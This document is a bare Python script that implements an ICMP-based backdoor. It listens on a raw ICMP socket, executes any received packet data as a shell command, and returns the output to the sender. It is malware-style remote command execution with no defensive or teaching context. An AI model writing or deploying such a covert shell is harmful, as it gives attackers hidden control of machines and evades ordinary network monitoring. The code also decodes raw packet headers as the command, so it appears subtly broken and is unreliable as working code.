import socket
import subprocess

def start_server():
    icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp"))
    icmp_socket.bind(("0.0.0.0", 0))
    icmp_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    while True:
        data, addr = icmp_socket.recvfrom(1024)
        print("Received connection from %s" % addr[0])
        print("Received data: %s" % data)
        shell_process = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = shell_process.stdout.read() + shell_process.stderr.read()
        icmp_socket.sendto(output, addr)

start_server()
